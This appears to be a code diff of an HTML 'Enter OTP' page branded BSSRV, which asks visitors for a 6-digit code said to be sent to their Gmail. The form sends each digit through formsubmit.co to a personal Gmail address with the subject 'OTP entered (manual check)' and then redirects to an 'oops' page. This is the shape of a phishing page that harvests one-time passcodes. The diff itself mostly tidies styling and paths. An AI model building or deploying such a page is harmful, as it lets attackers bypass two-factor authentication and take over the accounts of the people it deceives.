@@ -4,81 +4,80 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Enter OTP | BSSRV</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="assets/css/style.css">
+  <style>
+    /* OTP container styles */
+    .otp-container {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      max-width: 300px;
+      margin: 20px auto;
+    }
+
+    .otp-box {
+      width: 40px;
+      height: 50px;
+      text-align: center;
+      font-size: 24px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .login-box {
+      text-align: center;
+    }
+
+    .status {
+      color: green;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
 
-  <!-- ===== HEADER ===== -->
+  <!-- HEADER -->
   <header class="login-header">
     <div class="logo">
-      <img src="bssrv_logo.png" alt="BSSRV Logo">
+      <img src="assets/images/bssrv_logo.png" alt="BSSRV Logo" style="height:50px;">
       <h1>BSSRV</h1>
     </div>
   </header>
 
-  <!-- ===== ENTER OTP SECTION ===== -->
+  <!-- OTP SECTION -->
   <section class="login-section">
     <div class="login-box">
       <h2>Enter OTP</h2>
       <p>Please enter the 6-digit OTP sent to your Gmail.</p>
 
       <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
-        <!-- Hidden field to hold combined OTP -->
-        <input type="hidden" name="otp" id="fullOtp">
         <input type="hidden" name="_subject" value="OTP entered (manual check)">
         <input type="hidden" name="_next" value="oops.html">
 
         <div class="otp-container">
           <input type="text" maxlength="1" class="otp-box" name="digit1" required>
-<input type="text" maxlength="1" class="otp-box" name="digit2" required>
-<input type="text" maxlength="1" class="otp-box" name="digit3" required>
-<input type="text" maxlength="1" class="otp-box" name="digit4" required>
-<input type="text" maxlength="1" class="otp-box" name="digit5" required>
-<input type="text" maxlength="1" class="otp-box" name="digit6" required>
-
+          <input type="text" maxlength="1" class="otp-box" name="digit2" required>
+          <input type="text" maxlength="1" class="otp-box" name="digit3" required>
+          <input type="text" maxlength="1" class="otp-box" name="digit4" required>
+          <input type="text" maxlength="1" class="otp-box" name="digit5" required>
+          <input type="text" maxlength="1" class="otp-box" name="digit6" required>
         </div>
-<style>
-  .otp-container {
-  display: flex;           /* place boxes in a row */
-  justify-content: space-between; /* spread evenly */
-  gap: 10px;               /* optional space between boxes */
-  max-width: 300px;        /* adjust total width */
-  margin: 0 auto;          /* center horizontally */
-}
 
-.otp-box {
-  width: 40px;             /* size of each box */
-  height: 50px;
-  text-align: center;      /* center the digit */
-  font-size: 24px;
-  border: 1px solid #ccc;
-  border-radius: 5px;
-}
-</style>
         <div style="margin-top:12px;">
           <button type="submit">Submit OTP</button>
         </div>
       </form>
 
-      <p id="status" class="status" style="color:green;"></p>
+      <p id="status" class="status"></p>
       <p class="note">Didn't receive OTP? Try again later.</p>
     </div>
   </section>
+
   <script>
-    const form = document.getElementById('otpForm');
     const otpBoxes = document.querySelectorAll('.otp-box');
-    const fullOtp = document.getElementById('fullOtp');
+    const status = document.getElementById('status');
 
-    // Combine OTP and update hidden field
-    form.addEventListener('submit', (e) => {
-  const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
-  fullOtp.value = otpValue;
-  document.getElementById('status').innerText = 'Submitting OTP...';
-
-      // Form will submit normally; redirect handled by _next
-    });
-
-    // Auto-focus next box when typing
+    // Auto-focus to next box
     otpBoxes.forEach((box, i) => {
       box.addEventListener('input', () => {
         if (box.value.length === 1 && i < otpBoxes.length - 1) {
@@ -86,22 +85,13 @@
         }
       });
     });
+
+    // Show submitting status
+    const form = document.getElementById('otpForm');
+    form.addEventListener('submit', () => {
+      status.innerText = 'Submitting OTP...';
+    });
   </script>
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
